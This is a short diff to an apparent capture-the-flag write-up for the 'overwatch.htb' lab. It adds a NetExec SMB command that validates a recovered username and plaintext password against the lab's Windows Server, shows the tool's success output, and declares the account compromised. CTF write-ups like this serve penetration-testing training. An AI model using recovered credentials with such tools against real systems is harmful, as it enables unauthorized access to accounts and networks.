@@ -438,5 +438,13 @@ sqlmgmt:bIhBbzMMnB82yx
 
 I now have some credentials!
 
+```python
+nxc smb s200401.overwatch.htb -u sqlmgmt -p 'bIhBbzMMnB82yx'                                                                                                  
+SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.244.81   445    S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx
+```
+
+This user is now compromised!
+
 
 
